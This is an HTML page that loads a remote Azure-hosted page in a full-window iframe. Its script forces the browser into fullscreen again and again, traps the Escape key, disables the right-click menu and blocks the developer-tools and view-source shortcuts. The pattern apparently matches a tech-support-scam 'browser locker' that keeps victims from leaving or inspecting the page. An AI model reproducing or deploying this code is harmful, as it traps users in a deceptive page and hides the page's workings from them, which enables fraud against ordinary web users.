<html>
<head>
<style>
  body, html {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #000;
  }
  
  iframe {
    width: 100%;
    height: 100%;
    border: none;
    display: block;
  }
</style>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
</head>
<body>

<iframe
  id="myIframe"
  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null"
  allow="fullscreen *; autoplay *"
  allowfullscreen>
</iframe>

<script>
  let fullscreenExitAttempts = 0;
  let fullscreenActive = false;
  
  function enterFullscreen() {
    const docEl = document.documentElement;
    const requestFullscreen = docEl.requestFullscreen || 
                             docEl.webkitRequestFullscreen || 
                             docEl.msRequestFullscreen;
    
    if (requestFullscreen) {
      requestFullscreen.call(docEl).then(function() {
        fullscreenActive = true;
      }).catch(function() {});
    }
  }
  
  function exitFullscreen() {
    const exitFullscreen = document.exitFullscreen || 
                          document.webkitExitFullscreen || 
                          document.msExitFullscreen;
    
    if (exitFullscreen && fullscreenActive) {
      exitFullscreen.call(document).catch(function() {});
      fullscreenActive = false;
    }
  }
  
  function forceFullscreen() {
    if (!fullscreenActive) {
      enterFullscreen();
    }
  }
  
  document.addEventListener('fullscreenchange', function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      fullscreenActive = false;
      setTimeout(enterFullscreen, 100);
    } else {
      fullscreenActive = true;
    }
  });
  
  document.addEventListener('webkitfullscreenchange', function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      fullscreenActive = false;
      setTimeout(enterFullscreen, 100);
    } else {
      fullscreenActive = true;
    }
  });
  
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      e.preventDefault();
      e.stopPropagation();
      
      fullscreenExitAttempts++;
      
      setTimeout(function() {
        fullscreenExitAttempts = 0;
      }, 300);
      
      if (fullscreenExitAttempts >= 2) {
        exitFullscreen();
      } else {
        setTimeout(function() {
          if (fullscreenActive) {
            enterFullscreen();
          }
        }, 50);
      }
    }
  });
  
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
  });
  
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
      e.preventDefault();
      return false;
    }
  });
  
  window.addEventListener('load', function() {
    setTimeout(enterFullscreen, 500);
  });
  
  setInterval(forceFullscreen, 500);
</script>

</body>
</html>
